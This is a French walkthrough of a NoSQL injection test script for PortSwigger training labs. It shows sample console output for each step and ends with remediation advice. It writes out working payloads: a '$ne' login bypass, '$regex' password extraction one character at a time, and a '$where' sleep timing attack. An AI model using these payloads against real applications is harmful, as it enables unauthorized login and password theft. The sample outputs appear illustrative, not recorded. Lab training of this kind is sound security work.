# MANPAGE

Voici un **exemple exhaustif de l’exécution du script NoSQL injection pour les labs PortSwigger**, illustrant chaque étape, le comportement attendu, et la logique de contrôle, en s’appuyant sur les scénarios et techniques recommandés par PortSwigger[1][3][6][8].

---

### 1. Test NoSQL injection via GET (caractères spéciaux, fuzzing)

```
------------------------------------------------------
[1] Test NoSQL injection via GET (caractères spéciaux, fuzzing)
  [Test '] Réponse longueur: 1320
  [Test "] Réponse longueur: 1320
  [Test {] Réponse longueur: 1320
  [Test }] Réponse longueur: 1320
  [Test [] Réponse longueur: 1320
  [Test ]] Réponse longueur: 1320
  [Test $ne] Réponse longueur: 1450
  [Test $gt] Réponse longueur: 1320
  [Test $regex] Réponse longueur: 1600
  [Test admin] Réponse longueur: 1320
  [Contrôle] : Cherchez une différence de comportement (erreur, résultat inattendu, etc.).
```
**Comportement attendu** :  
- Le script injecte différents caractères et opérateurs NoSQL dans un paramètre GET.
- Il affiche la taille de la réponse pour chaque test, permettant de repérer une différence (erreur, fuite, ou affichage de données inattendues)[1][6].

---

### 2. Test NoSQL injection sur login (bypass booléen)

```
------------------------------------------------------
[2] Test NoSQL injection sur login (bypass booléen)
  [+] Bypass réussi : accès sans mot de passe !
Welcome, administrator!
Your account dashboard:
...
```
**Comportement attendu** :  
- Le script tente un login avec :  
  `{"username": {"$ne": null}, "password": {"$ne": null}}`
- Si la réponse contient "Welcome, administrator!" ou un dashboard utilisateur, le bypass est réussi, confirmant la vulnérabilité[8].

---

### 3. Test NoSQL injection conditionnelle (true/false)

```
------------------------------------------------------
[3] Test NoSQL injection conditionnelle (true/false)
  [True] Longueur: 1450
  [False] Longueur: 800
  [+] Injection conditionnelle possible (différence de comportement).
```
**Comportement attendu** :  
- Le script compare la longueur de la réponse pour une condition vraie (ex : password ≠ null) et une condition fausse (ex : password = "wrong").
- Une différence nette confirme la possibilité d’exploiter la logique conditionnelle pour extraire ou deviner des données[1][3].

---

### 4. Test NoSQL injection par regex

```
------------------------------------------------------
[4] Test NoSQL injection par regex
  [+] Mot de passe admin commence par 'a' !
```
**Comportement attendu** :  
- Le script tente un login avec :  
  `{"username": "admin", "password": {"$regex": "^a"}}`
- Si la réponse donne accès, cela indique que le mot de passe admin commence par 'a', permettant une extraction caractère par caractère[1][3][8].

---

### 5. Test NoSQL injection temporelle (timing attack)

```
------------------------------------------------------
[5] Test NoSQL injection temporelle (timing attack)
  [Timing] Délai mesuré : 5 secondes
  [+] Injection temporelle réussie (retard détecté) !
```
**Comportement attendu** :  
- Le script injecte une payload de type :  
  `{"username": "admin", "password": {"$where": "sleep(5000)"}}`
- Si la réponse prend sensiblement plus de temps (ici 5 secondes), cela confirme la vulnérabilité à l’injection temporelle[1].

---

### 6. Conseils/remédiation

```
------------------------------------------------------
[Remédiation & Conseils]
- Utilisez des ORM/ODM sécurisés, validez et escapez toutes les entrées utilisateur.
- N'acceptez jamais d'opérateurs NoSQL ($ne, $gt, $where, $regex, etc.) dans les entrées utilisateur.
- Pour les labs PortSwigger, exploitez la différence de comportement ou le timing pour obtenir un accès ou un flag.
- Documentation PortSwigger : https://portswigger.net/web-security/nosql-injection
```
**Comportement attendu** :  
- Le script rappelle les bonnes pratiques pour corriger la faille et sécuriser l’application[1].

---

### 7. Synthèse

```
------------------------------------------------------
[SYNTHÈSE]
1. Détection et test d’injection NoSQL (GET, POST, JSON).
2. Tests booléens, conditionnels, regex, et timing.
3. Contrôle automatisé de la réponse (succès, flag, différence de comportement).
4. Application des recommandations de sécurité.
------------------------------------------------------
```
